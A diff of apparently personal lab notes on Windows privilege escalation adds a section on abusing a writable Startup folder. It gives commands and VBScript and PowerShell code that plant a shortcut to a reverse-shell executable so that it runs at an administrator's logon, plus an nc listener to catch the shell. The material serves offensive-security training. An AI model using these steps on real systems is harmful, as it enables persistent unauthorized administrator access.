@@ -1,4 +1,4 @@
-# Windows PrivEsc
+<img width="1525" height="796" alt="image" src="https://github.com/user-attachments/assets/6e78a49c-7d27-4e2e-89bf-0a3c44b18b4d" /># Windows PrivEsc
 
 <img width="1907" height="364" alt="image" src="https://github.com/user-attachments/assets/82f1df6e-1dca-4555-bfea-af1faf6f0869" />
 
@@ -1660,7 +1660,171 @@ file://c:/windows/system32/cmd.exe
 
 <details>
   <summary>Startup Apps</summary>
+
+
+
+## 1. Check Startup directory permissions
+
+```ruby
+C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+```
+
+- **`-d`** : It means “Directory permissions” shows you who can read/write/delete in the folder.
+
+
+
+<img width="957" height="253" alt="image" src="https://github.com/user-attachments/assets/9db41fcc-2890-467c-80a8-94c3765d1967" />
+
+
+
+> ---
+> ### 📌 _Goal → If you find that the Users group has Write permission here, then any normal user can upload a file/Shortcut that will be executed automatically with any user (even the admin) running → Privilege Escalation._
+> ---
+
+
+## 2. Run vbs Script
+
+```ruby
+cscript C:\PrivEsc\CreateShortcut.vbs
+```
+
+- **`cscript`** : This is the command-line host for running VBScript (.vbs) files.
+- **`C:\PrivEsc\CreateShortcut.vbs`** : the script that we want to run it
+
+
+> this file when it run it make shortcut to **`C:\PrivEsc\reverse.exe`** and put it on **`startup`** directory
+
+
+<img width="527" height="108" alt="image" src="https://github.com/user-attachments/assets/57ce227b-f089-452b-b60f-292215f39d91" />
+
+
+> ---
+> ### 📌 _Goal → Instead of writing a shortcut manually, the script creates it automatically and places it in the correct place._
+> ---
+
+
+
+## 3. simulate an admin logon using RDP
+
+```ruby
+rdesktop -u admin 10.10.122.63
+```
+
+> here you login as admin just to simulate the attack, in real world the user who login shortcut will work you will take shell with it's privileges
+
+
+<img width="1525" height="796" alt="image" src="https://github.com/user-attachments/assets/0269105a-d525-451e-be67-f1c2d4fd4b1b" />
+
+
+## 4. open Listener on kali
+
+
+```ruby
+nc -lnvp 4444
+```
+
+
+<img width="1654" height="761" alt="image" src="https://github.com/user-attachments/assets/4f61d07d-c8d5-42b0-8343-8be29aef3acc" />
+
+
+
+
+
+- <details>
+     <summary>Notes</summary>
+
+     > ## content of vbs file
+     
+     ```ruby
+     Set oWS = WScript.CreateObject("WScript.Shell")
+     sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\ReverseShell.lnk"
+     Set oLink = oWS.CreateShortcut(sLinkFile)
+     oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+     oLink.Save
+     ```
+     
+     - **`sLinkFile`** : The location of the shortcut file that will be used (.lnk).
+     - **`oLink.TargetPath`** : Here is the PrivEsc at `C:\PrivEsc\reverse.exe`.
+     - **`oLink.Save`** : save shortcut
+     
+     ---
+     
+     > ## how to know what this shortcut refer to
+     
+     `right Click` → `properties` → `Shortcut`
+     
+     - you will see **`Target`** content is `C:\PrivEsc\reverse.exe` 
+     
+     **`or`**
+     
+     ```ruby
+     (Get-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\ReverseShell.lnk").TargetPath
+     ```
+     
+     ---
+     
+     > ## how to make shortcut manually
+     
+     **`Powershell`**
+     
+     ```ruby
+     $WshShell = New-Object -ComObject WScript.Shell
+     $Shortcut = $WshShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\malicious.lnk")
+     $Shortcut.TargetPath = "C:\PrivEsc\reverse.exe"
+     $Shortcut.Save()
+     ```
+     
+     `Or`
+     
+     #### Open `Explorer` write
+     
+     ```ruby
+     shell:startup
+     ```
+     
+     `then`
+     
+     **`Right Clicl`** → **`New`** → **`Shortcut`**
+     
+     
+     <img width="516" height="101" alt="image" src="https://github.com/user-attachments/assets/b62611a6-1cd4-4624-841c-b3c5e2ae9082" />
+     
+
+
+
+
+  </details>
+
+
+
+
+
+
+     
 </details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 <details>
   <summary>Token Impersonation</summary>
